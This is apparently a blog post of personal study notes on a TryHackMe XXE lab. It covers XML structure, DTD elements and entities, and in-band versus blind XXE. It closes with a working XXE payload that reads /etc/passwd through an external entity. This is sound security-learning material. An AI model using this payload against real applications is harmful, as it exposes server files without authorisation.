@@ -1,0 +1,66 @@
+---
+title: 'TryHackMe: Complete Beginner (Supplements)'
+date: 2021-12-09 06:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2021-12-09-tryhackme-complete-beginner-supplements.html
+author: 100007
+---
+
+<h1 id="tryhackme-complete-beginner-supplements">TryHackMe: Complete Beginner (Supplements)</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2021-12-09</p>
+<h2 id="xxe">XXE</h2>
+<h3 id="deploy-the-vm">Deploy the VM</h3>
+<p>I think I’ve basically done a different version of this room…</p>
+<p>Anyways, two types of XML External Entity (XXE) attacks:</p>
+<ul>
+<li>IN-BAND attacks are where the attacker receives an immediate response.</li>
+<li>OUT-OF-BAND (“blind”) attacks are when there is no immediate response and instead the attacker must receive the data indirectly (such as through a request to a second server under the attacker’s control).</li>
+</ul>
+<h3 id="extensible-markup-language">eXtensible Markup Language</h3>
+<p>Some things to remember about XML documents:</p>
+<ul>
+<li>Start with the standard prolog: <code class="language-plaintext highlighter-rouge">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>. This is not <em>technically</em> compulsory, but some parsers will barf if it’s missing.</li>
+<li>Every XML document has one and <em>only</em> one root element.</li>
+<li>XML is case sensitive.</li>
+</ul>
+<h3 id="dtd">DTD</h3>
+<p>The Document Type Definition defines/validates an XML document. For example, the DTD defined as</p>
+<pre><code class="language-dtd">&lt;!DOCTYPE note [
+&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+]&gt;
+</code></pre>
+<p>validate the XML document</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span>
+<span class="nt">&lt;note&gt;</span>
+<span class="nt">&lt;to&gt;</span>falcon<span class="nt">&lt;/to&gt;</span>
+<span class="nt">&lt;from&gt;</span>feast<span class="nt">&lt;/from&gt;</span>
+<span class="nt">&lt;heading&gt;</span>hacking<span class="nt">&lt;/heading&gt;</span>
+<span class="nt">&lt;body&gt;</span>XXE attack<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/note&gt;</span>
+</code></pre></div></div>
+<p>The root node is defined immediately after the DOCTYPE declaration, with each ELEMENT declaration taking the form <code class="language-plaintext highlighter-rouge">element_name (contained_data)</code>. <code class="language-plaintext highlighter-rouge">#PCDATA</code> stands for “printable character data.</p>
+<p>The DTD can also define multiple ENTITY types — <code class="language-plaintext highlighter-rouge">&amp;amp;</code> and similar.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE userInfo [
+&lt;!ENTITY name "feast"&gt;</span>
+]&gt;
+<span class="nt">&lt;userInfo&gt;</span>
+<span class="nt">&lt;firstName&gt;</span>falcon<span class="nt">&lt;/firstName&gt;</span>
+<span class="nt">&lt;lastName&gt;</span><span class="ni">&amp;name;</span><span class="nt">&lt;/lastName&gt;</span>
+<span class="nt">&lt;/userInfo&gt;</span>
+</code></pre></div></div>
+<p>Conveniently, DTD can be defined <em>in line</em>, and not just by included files.</p>
+<p>These last two features are what we will leverage to attack applications that accept XML inputs.</p>
+<h3 id="xxe-payload">XXE Payload</h3>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [
+&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;read;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>The SYSTEM directive allows us to include other files… Possibly quite sensitive ones, depending on the permissions of our webserver and how good the application’s input sanitization is.</p>
